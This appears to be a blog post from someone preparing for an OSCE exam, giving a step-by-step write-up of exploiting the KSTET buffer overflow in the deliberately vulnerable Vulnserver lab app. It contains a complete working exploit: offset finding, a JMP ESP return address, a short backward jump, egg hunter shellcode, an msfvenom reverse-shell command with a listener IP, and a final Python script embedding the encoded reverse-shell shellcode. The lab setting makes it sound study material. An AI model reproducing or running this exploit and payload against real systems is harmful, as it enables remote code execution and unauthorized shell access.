Welcome to the final step in my Vulnserver OSCE prep! In the last post we covered SEH exploitation. In this post we are covering egg hunters. As we saw in the last post, sometimes we don't have a lot of byte space to work with. Msfvenom is generates staged payloads around 350 bytes long, which although fairly small compared to the unstaged payload (180000 bytes~) can still be to big. This is where egg hunters come in handy. 

Essentially egg hunters allow us as exploit developers to separate our reverse shell payload from our exploit code. This is done by tagging our reverse shell payload with unique string e.g "CFOX". Then in our exploit buffer we can include shellcode to hunt for this unique string in memory. 

**WARNING!!** If you are following along with these exercises ensure the target host is 32 bit. I had major issues trying to get this to run on a 64 bit vm. The previous exercises ran with out issue on a Win10 64 bit system. 

### Fuzzing

We are going to kick fuzzing off the same as the last posts, using the same code as last time: 

[https://github.com/Cyber-F0x/vulnserver-writeup/tree/master/KSTET](https://github.com/Cyber-F0x/vulnserver-writeup/tree/master/KSTET)

As per the last two posts, boofuzz crashes the application by sending 5014 bytes. However I noticed that way less bytes actually ended up on the stack:

![image-20200423054507135](/assets/images/vulnserver/KSTET/image-20200423054507135.png)

I got pretty curious at this point and started messing around with the exact byte length needed to crash the KSTET command. During previous posts, I was not able to get a crash with anything less than 5013 bytes so I thought this was pretty interesting.

During this  confirmation process I was able to cause the application to crash with around 100  bytes! :

```python
def make_payload():
    prepend = b"KSTET /.:/"
    buf =  b""
    pattern = b"A"*100
    payload_struct = buf + pattern
    final_payload = prepend + payload_struct 
    return final_payload
```

This is enough to smash the EIP as can be seen below:

![image-20200423055222157](/assets/images/vulnserver/KSTET/image-20200423055222157.png)

### Exploitation

As per the last posts, we can use pwntools cyclic tools to narrow down the EIP. The only differance is the size of the cyclic buffer we need.

Drop in to the REPL and run:

```python
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Pop this into the payload like so:

```python
def make_payload():
    prepend = b"KSTET /.:/"
    buf =  b""
    pattern = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
    payload_struct = buf + pattern
    final_payload = prepend + payload_struct 
    return final_payload
```

On running this we can see the EIP is now smashed with "61726161":

![image-20200423055911312](/assets/images/vulnserver/KSTET/image-20200423055911312.png)

Once again we can find this offset in our buffer like so:

```python
[23-Apr-20 05:57:46] 192.168.1.64 KSTET > python3
Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyc
66
```

From this we can see that byte sequence is at offset 66 within our buffer. For a final confirmation we can borrow a portion of our TRUN payload, adjusting the byte lengths approriatly:

```python
def make_payload():
    prepend = b"KSTET /.:/"
    pattern = b"A"*66
    eip = b"B"*4
    buffer_space = 100 - len(pattern) - len(eip)
    payload_struct = pattern + eip + b'C'*buffer_space
    final_payload = prepend + payload_struct
    return final_payload
```

Which as we an see works like a charm:

![image-20200423060610088](/assets/images/vulnserver/KSTET/image-20200423060610088.png)

###  Bad Characters

As we know by now bad characters will mess up our day,  however as we are limited by bytes size we need to chop up our hex bytes up to fit in our payload. From 0x00 to 0xff there 256 bytes which we can split into 4 segments of 64 which makes it really easy for us. Even better for us, we can make python do all the heavy lifting.  Drop into the REPL and run the following commands:

```python
>>> a = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
>>> len(a)
256
>>> n = 64
>>> out = [(a[i:i+n]) for i in range(0, len(a), n)] 
>>> out[3]
'\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
>>>
```

What's happening here, is we are defining a list of bad chars in the variable "a". We then run a list comprehension to divide the string in to equal lengths of 64 which will make nice and easy to paste it straight into our payload. 

We can then insert and analyse the buffer just like we did for the TRUN command. 

### Exploit

Similar to the TRUN command, we need to do a JMP ESP.  Hop over to immunity and run

```python
 mona jmp -r ESP
```

This should give a list of addresses similar to the ones below:

![image-20200423062800355](/assets/images/vulnserver/KSTET/image-20200423062800355.png)

At this point pick one of the addresses at random and convert it to little endian. In this case Im going to choose 0x625011df (0xdf115062) and pop it into our payload like so:

```python
def make_payload():
    prepend = b"KSTET /.:/"
    pattern = b"A"*66
    eip = b"\xdf\x11\x50\x62"
    buffer_space = 100 - len(pattern) - len(eip)
    payload_struct = pattern + eip + b'C'*buffer_space
    final_payload = prepend + payload_struct
    return final_payload
```

At this point we need give ourselves more space. As a minimum we need 32 bytes for the egg hunter to run. To do this we are going to jump backwards using a jump short which we covered in the GMON post.  In this case I'm jumping back 72 bytes

```python
short_jmp = b'\xeb\xb8'
```

The next step is to generate the egg hunter code! 

We can do this in immunity by running:

```python
mona egg -t CFOX
```

where "t" is the tag the egg hunter will search for.

This should generate output similar to this:

```python
egg =  b""
egg += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egg += b"\xef\xb8\x43\x46\x4f\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
```

Now that we have both the space & the egghunter shellcode, we need to neaten up the payload.

```python
def make_payload():
    prepend = b"KSTET /.:/"
    pattern = b"A"*2
    egg =  b""
    egg += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egg += b"\xef\xb8\x43\x46\x4f\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    pad = b'B'*(62-len(egg)+2)
	eip = b"\xdf\x11\x50\x62"
    short_jmp = b'\xeb\xb8'
    buffer_space = 900
    payload_struct = pattern + egg + pad + eip + short_jmp + b'C'*buffer_space
    final_payload = prepend + payload_struct
    return final_payload
```

What I have done here is adjust the character padding in the payload so execution falls neatly to our shellcode. 

Generate the reverse shell payload like normal:

```bash
 sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.64 LPORT=5557 -b '\x00' -f c
```

In order to find our shellcode in memory we need to prefix it with the tag we specified in our mona command like so:

```python
def store(cmd):
	prepend = cmd +b" CFOXCFOX"
    buf = b''
    buf += b"\xda\xd0\xbf\xb8\x33\xa8\xe9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    buf += b"\x56\x83\xc2\x04\x31\x7a\x14\x03\x7a\xac\xd1\x5d\x15\x24\x97"
    [---SNIP---]
```

Finally to position our reverse shell in memory we need to establish a new connection to the service using one of the other commands. As we don't precisely know where our reverse shell will land, we need to enumerate through all the other commands like so:

```python
    parameters = [b"STATS",b"RTIME",b"LTIME",b"SRUN",b"TRUN",b"GMON",b"GDOG",b"HTER",b"LTER",b"KSTAN"]
    for each_cmd in parameters:
        stats_socket = tcp_socket(ip,port)  
        banner = stats_socket.recv(1024)
        stats_payload = store(each_cmd)
        print(f"Sending {str(each_cmd)}")
        stats_socket.send(stats_payload)
        sleep(1)
    stats_socket.close()
```

Once we put it all together our final script should look like this:

```python
#!/usr/bin/python3
from pwn import *
import socket
import argparse
from time import sleep


def main(ip,port):
    payload = make_payload()
    parameters = [b"STATS",b"RTIME",b"LTIME",b"SRUN",b"TRUN",b"GMON",b"GDOG",b"HTER",b"LTER",b"KSTAN"]
    for each_cmd in parameters:
        stats_socket = tcp_socket(ip,port)  
        banner = stats_socket.recv(1024)
        stats_payload = store(each_cmd)
        print(f"Sending {str(each_cmd)}")
        stats_socket.send(stats_payload)
        sleep(1)
    stats_socket.close()
    print(f"Sending exploit. Length: {len(payload)} bytes")
    exploit_socket = tcp_socket(ip,port)  
    #Pull the banner
    banner = exploit_socket.recv(1024)
    print(banner)
    exploit_socket.send(payload)
    exploit_socket.close()


def store(cmd):
    prepend = cmd +b" CFOXCFOX"
    buf = b''
    buf += b"\xda\xd0\xbf\xb8\x33\xa8\xe9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    buf += b"\x56\x83\xc2\x04\x31\x7a\x14\x03\x7a\xac\xd1\x5d\x15\x24\x97"
    buf += b"\x9e\xe6\xb4\xf8\x17\x03\x85\x38\x43\x47\xb5\x88\x07\x05\x39"
    buf += b"\x62\x45\xbe\xca\x06\x42\xb1\x7b\xac\xb4\xfc\x7c\x9d\x85\x9f"
    buf += b"\xfe\xdc\xd9\x7f\x3f\x2f\x2c\x81\x78\x52\xdd\xd3\xd1\x18\x70"
    buf += b"\xc4\x56\x54\x49\x6f\x24\x78\xc9\x8c\xfc\x7b\xf8\x02\x77\x22"
    buf += b"\xda\xa5\x54\x5e\x53\xbe\xb9\x5b\x2d\x35\x09\x17\xac\x9f\x40"
    buf += b"\xd8\x03\xde\x6d\x2b\x5d\x26\x49\xd4\x28\x5e\xaa\x69\x2b\xa5"
    buf += b"\xd1\xb5\xbe\x3e\x71\x3d\x18\x9b\x80\x92\xff\x68\x8e\x5f\x8b"
    buf += b"\x37\x92\x5e\x58\x4c\xae\xeb\x5f\x83\x27\xaf\x7b\x07\x6c\x6b"
    buf += b"\xe5\x1e\xc8\xda\x1a\x40\xb3\x83\xbe\x0a\x59\xd7\xb2\x50\x35"
    buf += b"\x14\xff\x6a\xc5\x32\x88\x19\xf7\x9d\x22\xb6\xbb\x56\xed\x41"
    buf += b"\xca\x71\x0e\x9d\x74\x11\xf0\x1e\x84\x3b\x37\x4a\xd4\x53\x9e"
    buf += b"\xf3\xbf\xa3\x1f\x26\x55\xae\xb7\x09\x01\xaf\x07\xe2\x53\xb0"
    buf += b"\x92\x47\xda\x56\xcc\xf7\x8c\xc6\xad\xa7\x6c\xb7\x45\xa2\x63"
    buf += b"\xe8\x76\xcd\xae\x81\x1d\x22\x06\xf9\x89\xdb\x03\x71\x2b\x23"
    buf += b"\x9e\xff\x6b\xaf\x2a\xff\x22\x58\x5f\x13\x52\x3f\x9f\xeb\xa3"
    buf += b"\xaa\x9f\x81\xa7\x7c\xc8\x3d\xaa\x59\x3e\xe2\x55\x8c\x3d\xe5"
    buf += b"\xaa\x51\x77\x9d\x9d\xc7\x37\xc9\xe1\x07\xb7\x09\xb4\x4d\xb7"
    buf += b"\x61\x60\x36\xe4\x94\x6f\xe3\x99\x04\xfa\x0c\xcb\xf9\xad\x64"
    buf += b"\xf1\x24\x99\x2a\x0a\x03\x99\x2d\xf4\xd1\xb6\x95\x9c\x29\x87"
    buf += b"\x25\x5c\x40\x07\x76\x34\x9f\x28\x79\xf4\x60\xe3\xd2\x9c\xeb"
    buf += b"\x62\x90\x3d\xeb\xae\x74\xe3\xec\x5d\xad\x14\x96\x2e\x52\xd5"
    buf += b"\x67\x27\x37\xd6\x67\x47\x49\xeb\xb1\x7e\x3f\x2a\x02\xc5\x30"
    buf += b"\x19\x27\x6c\xdb\x61\x7b\x6e\xce"
    final_payload = prepend + buf
    return final_payload
 
    
def make_payload():
    prepend = b"KSTET /.:/"
    pattern = b"A"*2
    egg =  b""
    egg += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egg += b"\xef\xb8\x43\x46\x4f\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    pad = b'B'*(62-len(egg)+2)
	eip = b"\xdf\x11\x50\x62"
    short_jmp = b'\xeb\xb8'
    buffer_space = 900
    payload_struct = pattern + egg + pad + eip + short_jmp + b'C'*buffer_space
    final_payload = prepend + payload_struct
    return final_payload
    

def tcp_socket(ip,port):
    network_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection_tuple = (ip,port)
    network_socket.connect(connection_tuple)
    return network_socket

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True, type=int)
    args = parser.parse_args()
    main(args.host,args.port)   

```

On running this we should get a reverse shell!

![image-20200426144344791](/assets/images/vulnserver/KSTET/image-20200426144344791.png)

### Conclusion

Although I had some issues messing around with the egghunter code, this was a really fun exercises. I hope you found this helpful, if you have any comments DM me on twitter. 

As usual the full source code can be found  below:

[https://github.com/Cyber-F0x/vulnserver-writeup/tree/master/KSTET](https://github.com/Cyber-F0x/vulnserver-writeup/tree/master/KSTET)

Next weeks blog post will be on a modern exploit topic! (Not decided which yet)

Till then:

- Cyber-F0x